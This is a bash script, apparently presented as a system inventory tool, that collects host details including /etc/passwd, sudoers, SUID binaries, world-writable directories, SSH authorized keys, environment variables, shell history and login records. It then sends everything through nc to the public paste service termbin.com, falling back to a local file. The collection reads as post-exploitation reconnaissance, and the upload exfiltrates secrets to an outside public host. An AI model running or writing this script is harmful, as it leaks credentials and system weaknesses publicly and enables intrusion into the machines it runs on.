#!/bin/bash

OUT=""

append() {
    OUT+="$1"$'\n'
}

append "=== HOSTNAME ===" && append "$(hostname)"
append "=== OS RELEASE ===" && append "$(cat /etc/os-release)"
append "=== KERNEL ===" && append "$(uname -a)"
append "=== CPU INFO ===" && append "$(lscpu 2>/dev/null)"
append "=== MEMORY ===" && append "$(free -h 2>/dev/null)"
append "=== DISK USAGE ===" && append "$(df -h 2>/dev/null)"
append "=== UPTIME ===" && append "$(uptime)"
append "=== USERS ===" && append "$(cat /etc/passwd)"
append "=== GROUPS ===" && append "$(cat /etc/group)"
append "=== LOGGED IN ===" && append "$(who && w)"
append "=== SUDOERS ===" && append "$(cat /etc/sudoers 2>/dev/null)"
append "=== SUDO GROUP MEMBERS ===" && append "$(getent group sudo 2>/dev/null)"
append "=== NETWORK INTERFACES ===" && append "$(ip a)"
append "=== ROUTING TABLE ===" && append "$(ip route)"
append "=== OPEN PORTS ===" && append "$(ss -tulnp)"
append "=== ARP TABLE ===" && append "$(arp -a)"
append "=== HOSTS FILE ===" && append "$(cat /etc/hosts)"
append "=== DNS ===" && append "$(cat /etc/resolv.conf)"
append "=== FIREWALL (iptables) ===" && append "$(iptables -L -n -v 2>/dev/null)"
append "=== FIREWALL (nftables) ===" && append "$(nft list ruleset 2>/dev/null)"
append "=== FIREWALL (ufw) ===" && append "$(ufw status verbose 2>/dev/null)"
append "=== CRON (root) ===" && append "$(crontab -l 2>/dev/null)"
append "=== CRON (system) ===" && append "$(ls -la /etc/cron* 2>/dev/null)"
append "=== CRON (all users) ===" && append "$(for u in $(cut -f1 -d: /etc/passwd); do crontab -u $u -l 2>/dev/null && echo "-- $u"; done)"
append "=== RUNNING SERVICES ===" && append "$(systemctl list-units --type=service --state=running 2>/dev/null)"
append "=== ALL SERVICES ===" && append "$(systemctl list-unit-files --type=service 2>/dev/null)"
append "=== INSTALLED PACKAGES (dpkg) ===" && append "$(dpkg -l 2>/dev/null)"
append "=== INSTALLED PACKAGES (rpm) ===" && append "$(rpm -qa 2>/dev/null)"
append "=== PROCESSES ===" && append "$(ps aux)"
append "=== MOUNTS ===" && append "$(mount | column -t)"
append "=== FSTAB ===" && append "$(cat /etc/fstab 2>/dev/null)"
append "=== SUID BINARIES ===" && append "$(find / -perm -4000 -type f 2>/dev/null)"
append "=== WORLD WRITABLE DIRS ===" && append "$(find / -type d -perm -0002 2>/dev/null)"
append "=== SSH AUTHORIZED KEYS ===" && append "$(find / -name 'authorized_keys' 2>/dev/null -exec echo {} \; -exec cat {} \;)"
append "=== SSH CONFIG ===" && append "$(cat /etc/ssh/sshd_config 2>/dev/null)"
append "=== ENVIRONMENT ===" && append "$(env)"
append "=== SHELL HISTORY ===" && append "$(cat ~/.bash_history 2>/dev/null)"
append "=== LAST LOGINS ===" && append "$(last 2>/dev/null)"
append "=== FAILED LOGINS ===" && append "$(lastb 2>/dev/null)"

# Upload to termbin
URL=$(echo "$OUT" | nc termbin.com 9999 2>/dev/null)

if [ -n "$URL" ]; then
    echo "Output uploaded to: $URL"
else
    # Fallback: save locally
    echo "$OUT" > /tmp/inventory.txt
    echo "Upload failed. Saved locally to /tmp/inventory.txt"
fi
